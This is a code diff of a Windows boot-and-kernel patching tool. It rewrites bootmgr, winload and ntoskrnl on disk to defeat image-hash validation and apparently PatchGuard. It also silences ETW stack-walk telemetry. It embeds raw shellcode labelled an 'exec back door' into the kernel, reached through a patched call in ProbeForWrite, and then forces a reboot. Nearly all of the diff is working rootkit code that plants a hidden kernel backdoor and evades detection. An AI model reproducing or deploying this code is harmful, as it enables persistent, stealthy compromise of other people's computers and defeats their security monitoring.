@@ -34,8 +34,10 @@ int main()
 		WriteBuffToFile(bootmgrP1, TmpBuff, FileSize);
 		DeleteFileW(bootmgrP2);
 
-		//cleanup & close process
+		//delete svc
 		DoDeleteSvc();
+
+		//close process
 		TerminateProcess(NtCurrentProcess(), 0);
 		return 0;
 	}
@@ -43,11 +45,15 @@ int main()
 	//read bootmgr (+ bak)
 	uint32_t bootmgrRawSize;
 	auto bootmgrBuff = _alloca(5242880); //5MB
-	if (!ReadFileToBuff(bootmgrP1, bootmgrBuff, &bootmgrRawSize)) {
+	if (ReadFileToBuff(bootmgrP1, bootmgrBuff, &bootmgrRawSize)) {
+		WriteBuffToFile(bootmgrP2, bootmgrBuff, bootmgrRawSize);
+	}
+
+	else {
+		//close process (no have bootmgr file)
 		TerminateProcess(NtCurrentProcess(), -1);
 		return 0;
 	}
-	WriteBuffToFile(bootmgrP2, bootmgrBuff, bootmgrRawSize);
 	
 	//legacy bootmgr (static patch)
 	if (BootType == FirmwareTypeBios) {
@@ -85,8 +91,15 @@ int main()
 		!ImgpValidateImageHashWinLoadOff ||
 		!ImgpValidateImageHashBootMgrOff) 
 	{
-		//cleanup & close
-		//SymFolderCleanup();
+		//delete backups
+		DeleteFileW(bootmgrP2);
+		DeleteFileW(winloadP2);
+		DeleteFileW(ntoskrnlP2);
+
+		//delete pdb cache
+		SymFolderCleanup();
+
+		//close process
 		TerminateProcess(NtCurrentProcess(), -1);
 		return -1;
 	}
@@ -124,29 +137,37 @@ int main()
 
 	//patch KiFilterFiberContext (ntoskrnl)
 	memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)KiFilterFiberContextOff), asmpatch, sizeof(asmpatch));
-
-	//patch EtwpStackWalkApc (ntoskrnl) //sit d0g!!1
-	*(uint8_t*)RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff) = 0xC3;
-
-	//add exec back door (ntoskrnl)
-	const uint8_t backDoor[] = {
-		0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x01, 0x48, 0xBA,
-		0xDE, 0xC0, 0xED, 0xFE, 0xAD, 0xDE, 0xCE, 0xFA, 0x48, 0x3B, 0xC2, 0x75,
-		0x44, 0x48, 0x8B, 0x41, 0x48, 0x4C, 0x8B, 0x51, 0x08, 0x4C, 0x8B, 0x49,
-		0x28, 0x4C, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x51, 0x18, 0x49, 0x89, 0x43,
-		0xF0, 0x48, 0x8B, 0x41, 0x40, 0x49, 0x89, 0x43, 0xE8, 0x48, 0x8B, 0x41,
-		0x38, 0x49, 0x89, 0x43, 0xE0, 0x48, 0x8B, 0x41, 0x30, 0x48, 0x89, 0x4C,
-		0x24, 0x50, 0x48, 0x8B, 0x49, 0x10, 0x49, 0x89, 0x43, 0xD8, 0x41, 0xFF,
-		0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC4,
-		0x48, 0xC6, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00
-	};
-	memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff + 1), backDoor, sizeof(backDoor));
 	
-	//find call ExRaiseDatatypeMisalignment in ProbeForWrite
-	for (int i = 0; i < 0x80; i++) {
-		if ((uint64_t)ExRaiseDatatypeMisalignmentOff == RVA(ntoskrnlBuff, ProbeForWriteOff + i, 5)) {
-			auto patchOff1 = int32_t((uint8_t*)EtwpStackWalkApcOff + 1 - (ProbeForWriteOff + i + 5));
-			*(int32_t*)RVA_VA(ntoskrnlBuff, (uint64_t)ProbeForWriteOff + i + 1) = patchOff1;
+	//get commandline
+	auto argc = 0;
+	auto argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+
+	//disable etw stackwalk & add backdoor
+	if (argc == 2)
+	{
+		//patch EtwpStackWalkApc (ntoskrnl) //sit d0g!!1
+		*(uint8_t*)RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff) = 0xC3;
+
+		//add exec back door (ntoskrnl)
+		const uint8_t backDoor[] = {
+			0x4C, 0x8B, 0xDC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x01, 0x48, 0xBA,
+			0xDE, 0xC0, 0xED, 0xFE, 0xAD, 0xDE, 0xCE, 0xFA, 0x48, 0x3B, 0xC2, 0x75,
+			0x44, 0x48, 0x8B, 0x41, 0x48, 0x4C, 0x8B, 0x51, 0x08, 0x4C, 0x8B, 0x49,
+			0x28, 0x4C, 0x8B, 0x41, 0x20, 0x48, 0x8B, 0x51, 0x18, 0x49, 0x89, 0x43,
+			0xF0, 0x48, 0x8B, 0x41, 0x40, 0x49, 0x89, 0x43, 0xE8, 0x48, 0x8B, 0x41,
+			0x38, 0x49, 0x89, 0x43, 0xE0, 0x48, 0x8B, 0x41, 0x30, 0x48, 0x89, 0x4C,
+			0x24, 0x50, 0x48, 0x8B, 0x49, 0x10, 0x49, 0x89, 0x43, 0xD8, 0x41, 0xFF,
+			0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC4,
+			0x48, 0xC6, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00
+		};
+		memcpy(RVA_VA(ntoskrnlBuff, (uint64_t)EtwpStackWalkApcOff + 1), backDoor, sizeof(backDoor));
+
+		//find call ExRaiseDatatypeMisalignment in ProbeForWrite
+		for (int i = 0; i < 0x80; i++) {
+			if ((uint64_t)ExRaiseDatatypeMisalignmentOff == RVA(ntoskrnlBuff, ProbeForWriteOff + i, 5)) {
+				auto patchOff1 = int32_t((uint8_t*)EtwpStackWalkApcOff + 1 - (ProbeForWriteOff + i + 5));
+				*(int32_t*)RVA_VA(ntoskrnlBuff, (uint64_t)ProbeForWriteOff + i + 1) = patchOff1;
+			}
 		}
 	}
 
@@ -165,16 +186,18 @@ int main()
 	//write ntoskrnl
 	WriteBuffToFile(ntoskrnlP1, ntoskrnlBuff, ntoskrnlRawSize);
 
-	//install cleanup service
+	//install svc
 	SvcInstall();
+
+	//delete pdb cache
+	SymFolderCleanup();
 
 	//force reboot
 	PrivilegeMgr("SeShutdownPrivilege", true);
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 	PrivilegeMgr("SeShutdownPrivilege", false);
 
-	//force close (bug hehe...)
-	//SymFolderCleanup();
+	//close process (no crt bug hehehe)
 	TerminateProcess(NtCurrentProcess(), 0);
 	return 0;
 }
